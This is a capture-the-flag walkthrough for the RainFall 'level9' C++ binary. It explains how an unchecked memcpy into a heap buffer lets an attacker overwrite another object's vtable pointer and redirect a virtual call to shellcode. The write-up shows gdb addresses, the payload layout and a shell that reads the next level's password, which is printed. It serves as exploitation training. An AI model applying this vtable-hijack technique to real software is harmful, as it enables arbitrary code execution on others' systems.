## level9

This is the first C++ level.

```cpp

class N {
  public:
    N(int value) : _value(value) {}

    void setAnnotation(const char* text) {
        std::memcpy(_annotation, text, std::strlen(text));
    }

    int operator+(const N& other) { return this->_value + other._value; }
    int operator-(const N& other) { return this->_value - other._value; }

    // at least one virtual method

  private:
    // 4 bytes here for the vtable
    char _annotation[100];
    int _value;
};

int main(int argc, char** argv) {
    if (argc < 2) std::exit(1);

    N* a = new N(5);
    N* b = new N(6);

    a->setAnnotation(argv[1]);
    return *b + *a;
}
```

A buffer overflow is available through `memcpy`, since the length of `text` is not checked. We'll use

> In computer programming, a virtual method table (VMT), virtual function table, virtual call table, dispatch table, vtable, or vftable is a mechanism used in a programming language to support dynamic dispatch (or run-time method binding).
> Whenever a class defines a virtual function (or method), most compilers add a hidden member variable to the class that points to an array of pointers to (virtual) functions called the virtual method table. These pointers are used at runtime to invoke the appropriate function implementations, because at compile time it may not yet be known if the base function is to be called or a derived one implemented by a class that inherits from the base class. 
> -- https://en.wikipedia.org/wiki/Virtual_method_table

This part of the assembly shows the use of a vtable. First we get `b`, then its first element (which is the vtable for classes with at least one virtual method) is read, then the first function of the vtable is called.

```nasm
   0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:   mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:   mov    edx,DWORD PTR [eax]
[...]
   0x08048693 <+159>:   call   edx
```

We want to override the first entry of b's vtable. To do so, we'll write a shellcode in `a->_annotation`

```
(gdb) p/x *(void **)( $esp + 0x14 )
$1 = 0x804a008
```

`a` = 0x0804a008
`a->_annotation` = 0x0804a00c
`a->_annotation + 4` (address of the shellcode) = 0x0804a010

The payload written in `a->_annotation`:
- address of the shellcode
- shellcode
- padding to reach `b`'s vtable
- address of `a->_annotation`

On the next line, `*b + *a` is going to be executed. It will jump to `a->_annotation` instead of `b`'s vtable, then when our fake vtable will point to the shellcode, which is going to be executed.

```console
level9@RainFall:~$ ./level9 $(python /tmp/level9.py)
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
